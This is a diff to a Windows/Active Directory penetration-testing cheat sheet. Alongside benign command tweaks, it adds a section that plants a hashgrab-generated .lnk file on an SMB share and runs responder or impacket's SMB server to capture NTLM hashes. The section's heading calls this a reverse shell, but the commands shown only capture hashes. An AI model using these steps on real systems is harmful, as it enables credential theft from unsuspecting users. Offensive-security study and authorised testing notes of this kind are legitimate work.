@@ -311,6 +311,12 @@ Simple way to get more information about files in directory, such as who owns th
 dir /a /o /q
 ```
 
+#### Check What Process is Running on a Port
+
+```bash
+Get-NetTCPConnection -LocalPort 8080 | Select-Object -Property OwningProcess | Get-Process
+```
+
 #### Interesting Object Permissions
 
 AD includes a wealth of permission types that can be used to configure an ACE. However, from an attacker's standpoint, we are mainly interested in a few key permission types. Here's a list of the most interesting ones along with a description of the permissions they provide:
@@ -394,9 +400,10 @@ schtasks /query /fo LIST /v /TN "FTP Backup"
 #### Recursively Search Through Directories (May only be in CMD)
 
 ```bash
-dir /s/b file.txt
+dir /s /b file.txt
+cmd /c "dir /s /b"
 ```
-Get-ChildItem -Path C:\ -Include "MSSQLSERVER","SQL","Server","*\?*","MSSQL16","SQLAGENT" -File -Recurse -ErrorAction SilentlyContinue
+
 #### Recursively Search a User's Workstation
 
 ```bash
@@ -1965,3 +1972,15 @@ cd C:\windows\system32
 $folderPath = "C:\java\jre\bin" ; if (!(Test-Path $folderPath -PathType Container)) {     New-Item -ItemType Directory -Path $folderPath | Out-Null } $envPath = [Environment]::GetEnvironmentVariable("PATH", "Machine") ; if ($envPath -notlike "*$folderPath*") {     $newPath = "$envPath;$folderPath"  ;   [Environment]::SetEnvironmentVariable("PATH", $newPath, "Machine") }
 ```
 
+#### Getting a Reverse Shell from SMB (Windows)
+
+You can create a .lnk file with hashgrab.py and impacket's smb server:
+
+```bash
+python3 /opt/hashgrab.py 192.168.45.163 test
+sudo responder -I tun0
+# or impacket-smbserver share share -smb2support
+smbclient \\\\$ip\\nara
+put test.lnk
+# look for hashes in smb server
+```
